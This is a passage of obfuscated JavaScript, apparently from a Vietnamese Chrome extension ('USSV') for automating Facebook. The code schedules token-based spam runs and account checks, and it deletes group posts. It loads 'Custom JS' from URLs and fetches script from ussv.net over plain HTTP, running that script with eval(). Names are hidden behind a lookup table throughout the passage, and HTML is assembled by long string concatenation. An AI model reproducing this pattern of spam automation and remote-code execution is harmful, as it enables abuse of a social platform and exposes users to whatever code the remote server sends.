                if (f1W[Z]($(g4)[f1W.m8y](), f1W.B3Q)) {
                    $(g4)[f1W.m8y](f1W.L9a);
                    var Y = O;
                    $(v4)[f1W.Q0I](E);
                    get_listcheck();
                    $(O1)[f1W.v37](f1W.y3Q);
                    $(g4)[f1W.m8y](f1W.L9a);
                    $(s1)[f1W.R4r]();
                    $(q1)[f1W.v37]();
                }
            } else if (f1W[V](n, f1W.L9a)) {
                $(g4)[f1W.m8y](f1W.c9a);
                var Y = n + W;
            } else {
                var Y = n + v1;
            }
            return Y;
        }

        function k1(W) {
            var V = "<br/>Now: <span class='st_time_now'>",
                E = ".note_panel_st_check_bt",
                O = ", còn l?i <span class='st_time_conlai'>",
                Z = "Quá trình Check s? di?n ra vào lúc ",
                F = "C?nh Báo: B?n dã d?t th?i gian ? quá kh?, vì v?y quá trình check s? không di?n ra, vui lòng di?u ch?nh l?i th?i gian !",
                o = "O46",
                U = "V46",
                p = "Ngay sau khi b?n Click B?t Ð?u, USSV s? ti?n hành Check !",
                M = "Q06",
                b = " gi? ",
                H = "t06",
                R = "w06",
                X = "x06",
                f = "l06",
                n = new Date(),
                Y = $(f1)[f1W.o07](),
                N = $(n1)[f1W.o07](),
                g = Y + f1W.V8Y + N,
                T = f1W[f](Y, n[f1W.m2Q]()),
                I = f1W[X](N, n[f1W.Y6v]());
            if (f1W[R](N, n[f1W.Y6v]())) {
                var I = f1W[H](n[f1W.Y6v](), N);
            }
            var D = T + b + I + v1;
            if (f1W[M](W, f1W.c9a)) {
                var G = p;
            } else {
                $(g4)[f1W.m8y](f1W.L9a);
                if (f1W[U](n[f1W.m2Q](), Y)) {
                    if (f1W[o](n[f1W.Y6v](), N)) {
                        $(g4)[f1W.m8y](f1W.c9a);
                        var G = F;
                    } else {
                        var G = Z + g + O + D + f1W.n5I;
                    }
                } else {
                    var G = Z + g + O + D + f1W.n5I;
                }
            }
            $(E)[f1W.Q0I](G + V + t1() + f1W.n5I);
        }

        function t1() {
            var W = function() {
                    timenow = V[f1W.m2Q]() + f1W.V8Y + V[f1W.Y6v]() + f1W.V8Y + V[f1W.I8O]();
                },
                V = new Date();
            W();
            return timenow;
        }
        var K4 = $(f1W.s5Y)[f1W.Q0I]();
        if (f1W[P7](K4, f1W.L9a)) {
            var K4 = J7;
        } else if (f1W[C7](K4, f1W.S9a)) {
            var K4 = L1;
        } else if (f1W[z7](K4, f1W.c9a)) {
            var K4 = g7;
        } else if (f1W[T7](K4, f1W.J9a)) {
            var K4 = h7;
        } else {
            var K4 = L1;
        }
        var V1 = $(f1W.M8Q)[f1W.Q0I]();
        if (f1W[Y7](V1, f1W.c9a)) {
            var V1 = u1;
        } else if (f1W[i7](V1, f1W.J9a)) {
            var V1 = f7;
        } else if (f1W[s7](V1, f1W.d9a)) {
            var V1 = M7;
        } else {
            var V1 = u1;
        }
        var p1 = $(f1W.o5r)[f1W.Q0I]();
        if (f1W[x9](p1, f1W.L9a)) {
            var p1 = e1;
        } else if (f1W[u9](p1, f1W.S9a)) {
            var p1 = x1;
        } else {
            var p1 = e1;
        }
        var B1 = $(f1W.i6v)[f1W.Q0I]();
        if (f1W[P9](B1, f1W.L9a)) {
            var B1 = e1;
        } else if (f1W[l9](B1, f1W.S9a)) {
            var B1 = x1;
        } else {
            var B1 = e1;
        }
        var L7 = f1W.V8v,
            u7 = $(f1W.G5Q)[f1W.Q0I]();
        if (f1W[c9](u7, f1W.B3Q)) {
            if (f1W[S9]($(f1W.i6v)[f1W.Q0I](), f1W.B3Q)) {
                var h = f1W.X6v;
                h += C9;
                h += i4;
                h += J9;
                h += U4;
                h += I9;
                h += z9 + B1 + f1W.X6v;
                h += Q4;
                h += y1;
                h += o4;
                h += F4;
                h += f1W.J50;
                h += i4;
                h += X7;
                h += U4;
                h += p7;
                h += r7;
                h += O7;
                h += U7;
                h += o4;
                h += F4;
                h += f1W.J50;
                h += i4;
                h += F7;
                h += U4;
                h += Q9;
                h += H1;
                h += Q4;
                h += o4;
                h += j7;
                h += W7;
                h += K9;
                h += w9;
                h += o4;
                h += F4;
                h += f1W.J50;
                h += G9;
                h += N4;
                h += R9;
                h += L4;
                h += Y9;
                h += a9;
                h += h9;
                h += D9;
                h += T9;
                h += N9;
                h += g9;
                h += X9;
                h += e9;
                h += o4;
                h += u4;
                h += f1W.w2v;
                h += N4;
                h += c1;
                h += L4;
                h += q9;
                h += u4;
                h += f1W.w2v;
                h += N4;
                h += k9;
                h += L4;
                h += M9;
                h += u4;
                h += f1W.w2v;
                h += N4;
                h += H9;
                h += L4;
                h += s9;
                h += u4;
                h += f1W.w2v;
                h += N4;
                h += S1;
                h += L4;
                h += n9;
                h += u4;
                h += f1W.w2v;
                h += f1W.J50;
                h += f9;
                h += m9;
                h += U4;
                h += i9;
                h += j9;
                h += V9;
                h += B9;
                h += O9;
                h += E9;
                h += o9;
                h += F9;
                h += Z9;
                h += r9;
                h += b9;
                h += p9;
                h += y9;
                h += U9;
                h += c2;
                h += S2;
                h += o4;
                h += F4;
                h += f1W.J50;
                h += P2;
                h += i4;
                h += w2;
                h += U4;
                h += u2;
                h += y1;
                h += l1;
                h += o4;
                h += G2;
                h += K2;
                h += t2;
                h += A2;
                h += o4;
                h += F4;
                h += f1W.J50;
                h += W9;
                h += N4;
                h += c1;
                h += L4;
                h += d2;
                h += u4;
                h += f1W.w2v;
                h += N4;
                h += S1;
                h += L4;
                h += Q2;
                h += u4;
                h += f1W.w2v;
                h += f1W.J50;
                h += f2;
                h += n2;
                h += N4;
                h += i2;
                h += L4;
                h += m2;
                h += u4;
                h += f1W.w2v;
                h += N4;
                h += M2;
                h += L4;
                h += k2;
                h += u4;
                h += f1W.w2v;
                h += N4;
                h += s2;
                h += L4;
                h += H2;
                h += u4;
                h += f1W.w2v;
                h += f1W.J50;
                h += U1;
                h += N2;
                h += U4;
                h += C2;
                h += I2;
                h += Y2;
                h += R2;
                h += D2;
                h += a2;
                h += o4;
                h += F4;
                h += f1W.J50;
                h += U1;
                h += p2;
                h += U4;
                h += X2;
                h += q2;
                h += D1;
                h += R1;
                h += Y1;
                h += a1;
                h += h1;
                h += z1;
                h += C1;
                h += J1;
                h += P1;
                h += T1;
                h += N1;
                h += g1;
                h += I1;
                h += m1;
                h += B2;
                h += O2;
                h += D1;
                h += R1;
                h += Y1;
                h += a1;
                h += h1;
                h += z1;
                h += C1;
                h += J1;
                h += P1;
                h += T1;
                h += N1;
                h += g1;
                h += I1;
                h += m1;
                h += E2;
                h += j2;
                h += F4;
                h += f1W.J50;
                h += U1;
                h += V2;
                h += U4;
                h += W2;
                h += l1;
                h += y1;
                h += o4;
                h += F4;
                h += f1W.J50;
                h += U1;
                h += A1;
                h += U4;
                h += U2;
                h += o2;
                h += F2;
                h += o4;
                h += F4;
                h += f1W.J50;
                h += U1;
                h += Z2;
                h += U4;
                h += r2;
                h += Q4;
                h += H1;
                h += o4;
                h += F4;
                h += f1W.J50;
                h += f1W.J50;
                h += i4;
                h += i1;
                h += U4;
                h += M1;
                h += o1;
                h += j1;
                h += d4;
                h += o4;
                h += F4;
                h += f1W.J50;
                h += f1W.J50;
            } else {
                var c7 = function(W) {
                    h = W;
                };
                c7(f1W.X6v);
            }
            var L7 = r1,
                T4 = f1W.X6v;
            T4 += Z1;
            T4 += O4;
            T4 += t4;
            T4 += G4;
            T4 += l4;
            T4 += S4;
            T4 += x4;
            T4 += E1;
            T4 += F1;
            T4 += o4;
            T4 += F4;
            T4 += f1W.J50;
        } else {
            var l7 = function(W) {
                h = W;
            };
            l7(f1W.X6v);
            var T4 = f1W.V8v;
        }
        if (f1W[d0]($(f1W.y7v)[f1W.o07](), f1W.S9a)) {
            var j0 = f1W.X6v;
            j0 += i4;
            j0 += a4;
            j0 += U4;
            j0 += c4;
            j0 += Q4;
            j0 += y1;
            j0 += o4;
            j0 += F4;
            j0 += f1W.J50;
            j0 += J4;
            j0 += i4;
            j0 += m4;
            j0 += U4;
            j0 += P4;
            j0 += Y4;
            j0 += z4;
            j0 += o4;
            j0 += F4;
            j0 += f1W.J50;
            j0 += i4;
            j0 += C4;
            j0 += U4;
            j0 += R0;
            j0 += Q4;
            j0 += h0;
            j0 += D4;
            j0 += o4;
            j0 += F4;
            j0 += f1W.J50;
            j0 += i4;
            j0 += t0;
            j0 += U4;
            j0 += e0;
            j0 += I4;
            j0 += H4;
            j0 += h4;
            j0 += o4;
            j0 += F4;
            j0 += f1W.J50;
            j0 += s4;
            j0 += N4;
            j0 += y4;
            j0 += R4;
            j0 += f1W.w2v;
            j0 += N4;
            j0 += k4;
            j0 += X4;
            j0 += f1W.w2v;
            j0 += f1W.J50;
            j0 += i4;
            j0 += M4;
            j0 += U4;
            j0 += E4;
            j0 += f4;
            j0 += n4;
            j0 += r4;
            j0 += W4;
            j0 += e4;
            j0 += o4;
            j0 += F4;
            j0 += f1W.J50;
            j0 += i4;
            j0 += q4;
            j0 += U4;
            j0 += b4;
            j0 += Q4;
            j0 += H1;
            j0 += o4;
            j0 += F4;
            j0 += f1W.J50;
            j0 += i4;
            j0 += w0;
            j0 += U4;
            j0 += c0;
            j0 += a0;
            j0 += S0;
            j0 += j4;
            j0 += z0;
            j0 += V4;
            j0 += D0;
            j0 += o4;
            j0 += F4;
            j0 += f1W.J50;
            j0 += i4;
            j0 += O0;
            j0 += A0;
            j0 += f1W.J50;
            j0 += i4;
            j0 += x0;
            j0 += U4;
            j0 += p4;
            j0 += F4;
            j0 += f1W.J50;
            j0 += i4;
            j0 += y0;
            j0 += U4;
            j0 += Z4;
            j0 += F4;
            j0 += f1W.J50;
            j0 += B4;
            j0 += f1W.J50;
        } else {
            var j0 = f1W.V8v;
        }
        if (f1W[L0]($(G0)[f1W.Q0I](), f1W.B3Q)) {
            var w4 = f1W.X6v;
            w4 += I0;
            w4 += M0;
            w4 += U4;
            w4 += T0;
            w4 += Q4;
            w4 += y1;
            w4 += o4;
            w4 += F4;
            w4 += f1W.J50;
        } else {
            var x7 = function(W) {
                w4 = W;
            };
            x7(f1W.X6v);
        }
        var W1 = f1W.X6v;
        for (var Q0 = f1W.L9a; f1W[C0](Q0, m0); Q0++) {
            if (f1W[u0](Q0, f1W.L9a)) {
                var W1 = W1 + g0;
            } else {
                if (f1W[Y0](Q0, f1W.G90)) {
                    var Q0 = f1W.c8Q + Q0;
                }
                var W1 = W1 + f1W.D9r + Q0 + f1W.P7a + Q0 + f1W.i0Q;
            }
        };
        var W1 = P0 + W1 + f1W.D2y,
            A4 = f1W.X6v;
        for (var Q0 = f1W.L9a; f1W[K0](Q0, f1W.H90); Q0++) {
            if (f1W[v0](Q0, f1W.L9a)) {
                var A4 = A4 + g0;
            } else {
                if (f1W[l0](Q0, f1W.G90)) {
                    var Q0 = f1W.c8Q + Q0;
                }
                var A4 = A4 + f1W.D9r + Q0 + f1W.P7a + Q0 + f1W.i0Q;
            }
        };
        var A4 = N0 + A4 + f1W.D2y,
            S7 = k0,
            K7 = f0 + W1 + f1W.C2r + A4 + f1W.C2r + S7 + f1W.w9O,
            Q1 = new Date(),
            b1 = f1W.X6v;
        for (var Q0 = Q1[f1W.m2Q](); f1W[J0](Q0, i0); Q0++) {
            var b1 = b1 + f1W.D9r + Q0 + f1W.P7a + Q0 + V0;
        }
        var b1 = s0 + b1 + b0,
            X1 = f1W.X6v;
        for (var Q0 = f1W.L9a; f1W[U0](Q0, n0); Q0++) {
            var d1 = f1W.V8v;
            if (f1W[X0](Q0, Q1[f1W.Y6v]())) {
                var d1 = f1W.J9r;
            }
            var X1 = X1 + f1W.D9r + Q0 + A + d1 + f1W.m77 + Q0 + Z0;
        }
        var X1 = o0 + X1 + f1W.D2y,
            w7 = B0 + b1 + f1W.C2r + X1 + f1W.K5O,
            v7 = $(f1W.z60)[f1W.m8y]();
        if ($(O1).length) {
            $(O1)[f1W.l6Q](f1W.Y5a);
            if (f1W[w]($(g4)[f1W.Q0I](), f1W.B3Q)) {
                $(v4)[f1W.Q0I](W0);
            } else {
                $(v4)[f1W.Q0I](f1W.V8v);
                $(H0)[f1W.l6Q](f1W.Y5a);
            }
            if (f1W[q0]($(f1W.z7O)[f1W.o07](), f1W.S9a)) {
                $(f1W.a9X)[f1W.l6Q](f1W.Y5a);
            } else {
                $(f1W.a9X)[f1W.v37]();
            }
        } else {
            uss[f1W.w6O](function(G) {
                var C = "#hide_div_st",
                    z = ".st.stt",
                    P = ".st.timeadd",
                    J = "#uss_st_spam_wall_via",
                    c = "#Hide_More_CustomJs",
                    L = "#Show_More_CustomJs",
                    E0 = "#Btn_Custom_Test",
                    F0 = "#Btn_Custom",
                    K = "c58",
                    r0 = ".uss_st_open_AccList",
                    Q = "T58",
                    S = ".st_check_panel",
                    u = "#div_sl_hengio",
                    p0 = "#uss_st_hengio";
                uss[f1W.T4O]();
                uss[f1W.e0Q]();
                chrome[f1W.v1O][f1W.N0v][f1W.G47]([f1W.n8X], function(W) {
                    var V = "E58";
                    if (f1W[V](W[f1W.n8X], undefined)) {} else {
                        UParse[f1W.K1I]({
                            "type": f1W.G47
                        });
                    }
                });
                $(s1)[f1W.Z6O](function() {
                    var W = "i58",
                        V = " Ta`i Khoa?n Ba´t Ðâ`u",
                        E = "Tiê´n ha`nh Kiê?m Tra ",
                        O = "red",
                        Z = "Vui lòng Khóa List Token tru?c khi ti?n hành Spam. N?u b?n không chú ý và Vi ph?m quá 3 l?n b?n s? b? khóa Tài Kho?n !",
                        F = " Token Ba´t Ðâ`u",
                        o = "Tiê´n ha`nh SPAM ",
                        U = "n58",
                        p = "M58",
                        M = "rgb(168, 42, 47)",
                        b = "e58",
                        H = "p58",
                        R = "577|_|_|ok|check",
                        X = "Hoàn thành l?y d? li?u Custom JS",
                        f = "o58",
                        n = "r58",
                        Y = "#uss_st_stt_acc_check",
                        N = "#thong_check_totalneed, #thongke_totla_acc_check",
                        g = $(f1W.M40)[f1W.o07]();
                    $(N)[f1W.Q0I](g);
                    $(f1W.o5r)[f1W.Q0I]($(f1W.J80)[f1W.o07]());
                    $(f1W.i6v)[f1W.Q0I]($(f1W.n67)[f1W.o07]());
                    $(f1W.E9a)[f1W.Q0I]($(f1W.X8X)[f1W.o07]());
                    $(f1W.M8Q)[f1W.Q0I]($(f1W.I1X)[f1W.o07]());
                    $(f1W.s5Y)[f1W.Q0I]($(f1W.f7Y)[f1W.o07]());
                    $(f1W.z60)[f1W.m8y]($(f1W.F1Y)[f1W.o07]());
                    $(f1W.z3y)[f1W.m8y]($(f1W.z7O)[f1W.o07]());
                    $(f1W.l7y)[f1W.m8y]($(Y)[f1W.o07]());
                    if (f1W[n]($(f1W.J2I)[f1W.o07](), f1W.S9a)) {
                        if (f1W[f]($(f1W.F0X)[f1W.o07](), f1W.L9a)) {
                            uss[f1W.T1r]({
                                "Url": $(f1W.E3r)[f1W.o07](),
                                "Type": f1W.L9a
                            });
                            dom_logs_ussv(X, R);
                        }
                    }
                    if (f1W[H]($(p0)[f1W.o07](), f1W.B5r)) {
                        if (f1W[b]($(g4)[f1W.m8y](), f1W.L7Q)) {
                            $(v4)[f1W.Q0I](lang_vi_st_check_note_hengio_error);
                            $(u)[f1W.C3O](f1W.K1v, M);
                        } else {
                            $(S)[f1W.F50](f1W.Y5a);
                            $(v4)[f1W.Q0I](lang_vi_st_check_note_hengio);
                            $(q1)[f1W.R4r]();
                            $(this)[f1W.v37]();
                            $(g4)[f1W.Q0I](f1W.B3Q);
                        }
                    } else {
                        UParse[f1W.K1I]({
                            "type": f1W.d6X
                        });
                        if (f1W[p]($(f1W.b10)[f1W.o07](), f1W.S9a)) {
                            if (f1W[U]($(f1W.L5X)[f1W.V6Q](f1W.p4I), f1W.p4I)) {
                                $(O1)[f1W.F50](f1W.Y5a);
                                $(g4)[f1W.Q0I](f1W.c8Q);
                                $(f1W.c87)[f1W.Q0I](f1W.B3Q);
                                dom_logs_ussv(o + g + F, f1W.b3r);
                                SpamV2[f1W.Z0y]();
                            } else {
                                alert(Z);
                                Div_AccList();
                                $(f1W.m5a)[f1W.C3O](f1W.K1v, O);
                            }
                        } else {
                            dom_logs_ussv(E + g + V, f1W.b3r);
                            if (f1W[W]($(f1W.I5O)[f1W.o07](), f1W.S9a)) {
                                $(f1W.e3r)[f1W.R4r]();
                                CheckV2[f1W.Z0y]();
                            } else {
                                $(f1W.e3r)[f1W.v37]();
                                get_listcheck();
                            }
                            $(O1)[f1W.F50](f1W.Y5a);
                            $(g4)[f1W.Q0I](f1W.c8Q);
                        }
                    }
                    var T = new Date(),
                        I = +T[f1W.m2Q]() + f1W.V8Y + T[f1W.Y6v]() + f1W.V8Y + T[f1W.I8O](),
                        D = I + f1W.F0v;
                    $(f1W.T8y)[f1W.l6Q](f1W.Y5a);
                    $(f1W.L6I)[f1W.F50](f1W.Y5a);
                });
                $(q1)[f1W.Z6O](function() {
                    $(S)[f1W.l6Q](f1W.Y5a);
                    $(q1)[f1W.v37]();
                    $(s1)[f1W.R4r]();
                    $(v4)[f1W.Q0I](lang_vi_st_check_note_hengio_cancel);
                    $(g4)[f1W.m8y](f1W.L9a);
                });
                $(f1W.w2y)[f1W.i77](function() {
                    var W = "uss_st_type_internet_auto_rs_div",
                        V = "a58",
                        E = $(this)[f1W.o07]();
                    if (f1W[V](E, f1W.S9a)) {
                        $(f1W.k87)[f1W.l6Q](f1W.Y5a);
                    } else {
                        $(W)[f1W.F50](f1W.Y5a);
                    }
                });
                if (f1W[Q]($(f1W.I5O)[f1W.o07](), f1W.S9a)) {
                    $(f1W.e3r)[f1W.R4r]();
                    $(f1W.N6X)[f1W.l6Q](f1W.Y5a);
                };
                $(f1W.I5O)[f1W.L0Q](f1W.i77)[f1W.i77](function() {
                    var W = "I58",
                        V = $(this)[f1W.o07]();
                    if (f1W[W](V, f1W.S9a)) {
                        $(f1W.N6X)[f1W.l6Q](f1W.Y5a);
                        Div_AccList();
                    } else {
                        $(f1W.N6X)[f1W.F50](f1W.Y5a);
                    }
                });
                $(r0)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
                    Div_AccList();
                });
                $(f1W.b10)[f1W.L0Q](f1W.i77)[f1W.i77](function() {
                    var W = ".spam_token",
                        V = "List Token",
                        E = "#popup_AccList_title",
                        O = ".spam_token,.Spam_TotalThread",
                        Z = "J58",
                        F = $(this)[f1W.o07]();
                    if (f1W[Z](F, f1W.S9a)) {
                        $(O)[f1W.l6Q](f1W.Y5a);
                        Div_AccList();
                        $(f1W.E8a)[f1W.v37]();
                        $(f1W.h7y)[f1W.R4r]();
                        $(E)[f1W.Q0I](V);
                        $(f1W.m5a)[f1W.Q0I](_lJ[f1W.G3v]({
                            "t": f1W.J9I,
                            "id": f1W.i20
                        }));
                    } else {
                        $(W)[f1W.F50](f1W.Y5a);
                    }
                });
                if (f1W[K]($(f1W.z7O)[f1W.o07](), f1W.S9a)) {
                    $(f1W.a9X)[f1W.l6Q](f1W.Y5a);
                } else {
                    $(f1W.a9X)[f1W.F50](f1W.Y5a);
                }
                $(f1W.z7O)[f1W.L0Q](f1W.i77)[f1W.i77](function() {
                    var W = "u58",
                        V = $(this)[f1W.o07]();
                    if (f1W[W](V, f1W.S9a)) {
                        $(f1W.a9X)[f1W.l6Q](f1W.Y5a);
                    } else {
                        $(f1W.a9X)[f1W.F50](f1W.Y5a);
                    }
                });
                $(f1W.O7Q)[f1W.L0Q](f1W.i77)[f1W.i77](function() {
                    var W = ".SettingGroup",
                        V = "v58",
                        E = $(this)[f1W.o07]();
                    if (f1W[V](E, f1W.S9a)) {
                        $(W)[f1W.l6Q](f1W.Y5a);
                    } else {
                        $(W)[f1W.F50](f1W.Y5a);
                    }
                });
                $(F0)[f1W.Z6O](function() {
                    var W = "udata";
                    uss[f1W.T1r]({
                        "Url": $(this)[f1W.V6Q](W),
                        "Type": f1W.S9a
                    });
                });
                $(E0)[f1W.Z6O](function() {
                    $(this)[f1W.v37]();
                    uss[f1W.T1r]({
                        "Url": $(f1W.E3r)[f1W.o07](),
                        "Btn": E0,
                        "Type": f1W.S9a
                    });
                    uss[f1W.T1r]({
                        "Url": $(f1W.E3r)[f1W.o07](),
                        "Type": f1W.L9a
                    });
                    chrome[f1W.v1O][f1W.N0v][f1W.v0Q]({
                        "st_CustomJs_Url": $(f1W.E3r)[f1W.o07](),
                        "sl_CustomJS": $(f1W.J2I)[f1W.o07](),
                        "st_sl_CustomJs_Type": $(f1W.F0X)[f1W.o07]()
                    }, function() {});
                });
                $(f1W.J2I)[f1W.i77](function() {
                    var W = "G58",
                        V = $(this)[f1W.o07]();
                    if (f1W[W](V, f1W.L9a)) {
                        $(f1W.B2O)[f1W.v37](f1W.Y5a);
                    } else {
                        $(f1W.B2O)[f1W.l6Q](f1W.Y5a);
                    }
                });
                $(L)[f1W.Z6O](function() {
                    $(this)[f1W.v37]();
                });
                $(c)[f1W.Z6O](function() {
                    $(f1W.B2O)[f1W.v37]();
                });
                $(f1W.F0X)[f1W.i77](function() {
                    var W = "A58",
                        V = $(this)[f1W.o07]();
                    if (f1W[W](V, f1W.L9a)) {
                        $(f1W.U9Y)[f1W.Q0I](_lJ[f1W.G3v]({
                            "t": f1W.K1I,
                            "id": f1W.H7a
                        }));
                        uss[f1W.T1r]({
                            "Url": $(f1W.E3r)[f1W.o07](),
                            "Type": f1W.L9a
                        });
                    } else {
                        $(f1W.U9Y)[f1W.Q0I](_lJ[f1W.G3v]({
                            "t": f1W.K1I,
                            "id": f1W.a8a
                        }));
                    }
                });
                $(r0)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
                    Div_AccList();
                });
                $(f1W.A67)[f1W.i77](function() {
                    var W = "j06",
                        V = $(this)[f1W.o07]();
                    if (f1W[W](V, f1W.I2O)) {
                        $(f1W.v7y)[f1W.R4r]();
                    } else {
                        $(f1W.v7y)[f1W.R4r]();
                    }
                });
                $(f1W.q9O)[f1W.i77](function() {
                    var W = "B06";
                    B = $(f1W.Q9Q);
                    More = $(f1W.I5v);
                    type = $(this)[f1W.o07]();
                    if (f1W[W](type, f1W.S9a)) {
                        More[f1W.R4r]();
                        B[f1W.F50](f1W.Y5a);
                    } else {
                        More[f1W.v37]();
                        B[f1W.l6Q](f1W.Y5a);
                    }
                });
                $(J)[f1W.i77](function() {
                    var W = "#ussv_logs_list_selec_many_spam",
                        V = "#div_info_link_wall",
                        E = "F06";
                    type = $(this)[f1W.o07]();
                    if (f1W[E](type, f1W.J9a)) {
                        $(V)[f1W.l6Q](f1W.Y5a);
                        $(W)[f1W.o07](f1W.B3Q)[f1W.V6Q](f1W.J9r, f1W.A0r);
                    } else {
                        $(V)[f1W.F50](f1W.Y5a);
                    }
                });
                $(f1W.n7a)[f1W.i77](function() {
                    var W = "X06",
                        V = "y06";
                    B = $(f1W.Q9Q);
                    type = $(f1W.q9O)[f1W.o07]();
                    needFr = $(f1W.n7a)[f1W.o07]();
                    if (f1W[V](type, f1W.S9a)) {
                        if (f1W[W](needFr, f1W.y3Q)) {
                            B[f1W.F50](f1W.Y5a);
                        } else {
                            B[f1W.l6Q](f1W.Y5a);
                            $(f1W.c4v)[f1W.o07](needFr)[f1W.V6Q](f1W.J9r, f1W.A0r);
                        }
                    } else {
                        B[f1W.l6Q](f1W.Y5a);
                    }
                });
                $(f1W.c6v)[f1W.i77](function() {
                    var W = "k06",
                        V = ".st.spam.inbox.more";
                    More = $(V);
                    type = $(this)[f1W.o07]();
                    if (f1W[W](type, f1W.S9a)) {
                        More[f1W.R4r]();
                    } else {
                        More[f1W.v37]();
                    }
                });
                $(f1W.F6v)[f1W.i77](function() {
                    var W = "#div_info_link_inbox,#div_info_img_inbox",
                        V = "#div_info_img_inbox",
                        E = "m06",
                        O = "#div_info_link_inbox",
                        Z = "s06";
                    type = $(this)[f1W.o07]();
                    if (f1W[Z](type, f1W.C5a)) {
                        $(O)[f1W.l6Q](f1W.Y5a);
                    } else if (f1W[E](type, f1W.S9y)) {
                        $(V)[f1W.l6Q](f1W.Y5a);
                    } else {
                        $(W)[f1W.F50](f1W.Y5a);
                    }
                });
                $(f1W.w2I)[f1W.i77](function() {
                    var V = "alert",
                        E = "Y06";
                    type = $(this)[f1W.o07]();
                    if (f1W[E](type, f1W.S9a)) {
                        var O = function(W) {
                            acc_doing[f1W.Y0v] = W;
                        };
                        O(f1W.S9a);
                        div_thongbao(_lJ[f1W.G3v]({
                            "t": V,
                            "id": f1W.u4X,
                            "r": f1W.W1I
                        }));
                    } else {
                        var Z = function(W) {
                            acc_doing[f1W.Y0v] = W;
                        };
                        Z(f1W.L9a);
                    }
                });
                $(f1W.I1X)[f1W.i77](function() {
                    var W = "D06",
                        V = $(this)[f1W.o07]();
                    if (f1W[W](V, f1W.u0O)) {
                        div_thongbao(_lJ[f1W.G3v]({
                            "t": f1W.K1I,
                            "id": f1W.h7X,
                            "r": f1W.W1I
                        }));
                    } else {}
                });
                $(f1W.a9y)[f1W.i77](function() {
                    var W = "#div_st_spam",
                        V = "g06",
                        E = $(f1W.a9y)[f1W.o07]();
                    if (f1W[V](E, f1W.B5r)) {
                        $(W)[f1W.l6Q](f1W.Y5a);
                    } else {
                        $(W)[f1W.F50](f1W.Y5a);
                        $(f1W.n67)[f1W.o07](f1W.L9a);
                    }
                });
                $(P)[f1W.k4O](function() {
                    $(v4)[f1W.Q0I](lang_vi_st_check_note_timeadd);
                });
                $(z)[f1W.k4O](function() {
                    $(v4)[f1W.Q0I](lang_vi_st_check_note_stt);
                });
                $(f1W.M50)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
                    $(v4)[f1W.Q0I](_lJ[f1W.G3v]({
                        "t": f1W.K1I,
                        "id": f1W.w2X
                    }));
                });
                $(p0)[f1W.i77](function() {
                    var W = "C06",
                        V = $(p0)[f1W.o07]();
                    if (f1W[W](V, f1W.B5r)) {
                        $(u)[f1W.l6Q](f1W.Y5a);
                        k1();
                    } else {
                        $(u)[f1W.F50](f1W.Y5a);
                        k1(f1W.c9a);
                    }
                });
                $(f1)[f1W.i77](function() {
                    k1();
                });
                $(n1)[f1W.i77](function() {
                    k1();
                });
                $(C)[f1W.Z6O](function() {
                    $(O1)[f1W.F50](f1W.Y5a);
                    stop_check();
                });
            });
        }
        var G7 = setInterval(function() {
            var W = ".st_time_conlai",
                V = ".st_time_now";
            $(V)[f1W.Q0I](t1());
            $(W)[f1W.Q0I](q7());
        }, f1W.Q8r);
    }

    function div_ussv_fb_tools(O) {
        if ($(f1W.H6Y).length) {
            $(f1W.H6Y)[f1W.l6Q](f1W.Y5a);
        } else {
            chrome[f1W.d60][f1W.K4r]({
                method: 'GET',
                action: 'xhttp',
                url: 'http://ussv.net/addon/html/html_panel_fb_tools.php',
                data: "xczxc=sads"
            }, function(W) {
                var W = W[f1W.X3Q]("USSV-SPACE-PARSE<br/>"),
                    V = W[0],
                    E = W[1];
                $("body")[f1W.u2r](V);
                eval(E[f1W.F6r]('<script type="text/javascript">', '')[f1W.F6r]('</script>', ''));
                ThaoTac_Fb_Tools();
            });
        }
    }

    function fast_log(V, E, O) {
        var Z = "ussv_ST_url_fl";
        chrome[f1W.v1O][f1W.N0v][f1W.G47]([Z], function(W) {
            fast_log1(V, E, O, W[Z]);
        });
    }

    function st_check_time() {
        var W = "s26",
            V = "k26",
            E = "X26",
            O = "#uss_st_time_add_acc_y",
            Z = "#uss_st_time_add_acc_m",
            F = "#uss_st_time_add_acc_h";
        d = $(F)[f1W.o07]();
        m = $(Z)[f1W.o07]();
        y = $(O)[f1W.o07]();
        if (f1W[E](d, f1W.L9a) || f1W[V](m, f1W.L9a) || f1W[W](y, f1W.L9a)) {
            var o = f1W.L9a;
        } else {
            var o = d + f1W.r7Q + m + f1W.r7Q + y;
        }
        return o;
    }

    function ussv_help_hd_text(o, U) {
        var p = "http://ussv.net/help/ussv_huong_dan/ussv_huong_dan_000.html",
            M = ".html",
            b = "http://ussv.net/help/ussv_huong_dan/ussv_huong_dan_",
            H = "g3b",
            R = "#uh_t_note1, #uh_t_note2",
            X = "help_loc_trung",
            f = "D3b";
        if (f1W[f](U, X)) {
            $(R)[f1W.Q0I](img_load);
            $(f1W.W8r)[f1W.l6Q](f1W.Y5a);
        }
        if (f1W[H](o, f1W.L9a)) {
            var n = b + o + M;
        } else {
            var n = p;
        }
        chrome[f1W.d60][f1W.K4r]({
            method: 'GET',
            action: 'xhttp',
            url: n,
            data: "hj=hj"
        }, function(W) {
            var V = "C3b",
                E = W[f1W.X3Q]("|"),
                O = E[0][f1W.X3Q]("_"),
                O = O[1],
                Z = E[1][f1W.F6r](/\n/g, "<br/>"),
                F = E[2][f1W.F6r](/\n/g, "<br/>");
            if (f1W[V](U, "help_loc_trung")) {
                $("#title_help_loc_trung")[f1W.m8y](O);
                $(".body_help_loc_trung")[f1W.Q0I](Z);
                $(".show_help_loc_trung")[f1W.v37]();
                $(".body_help_loc_trung")[f1W.l6Q](500);
            } else {
                $("#popup_help_title")[f1W.Q0I](O);
                $("#uh_t_note1")[f1W.Q0I](Z);
                $("#uh_t_note2")[f1W.Q0I](F);
            }
        });
    }

    function uss_cr_is_link(O, Z, F, o, U) {
        chrome[f1W.d60][f1W.K4r]({
            method: 'POST',
            action: 'xhttp',
            url: 'http://is.gd/create.php',
            data: "url=http://google.com/&shorturl=" + uss_cr_denho_ran_url() + "_is&opt=0"
        }, function(W) {
            var V = "I7E",
                E = W[f1W.x3y](/chl=(.*?)\">Give me this URL/i);
            if (f1W[V](E, null)) {
                thongbao_log(1, "Lô~i");
            } else {
                thongbao_log(1, E[1]);
            }
        });
    }

    function del_post_gr(E, O, Z) {
        var F = "912825075396173",
            o = F,
            U = f1W.z27,
            E = E;
        $[f1W.c9y]({
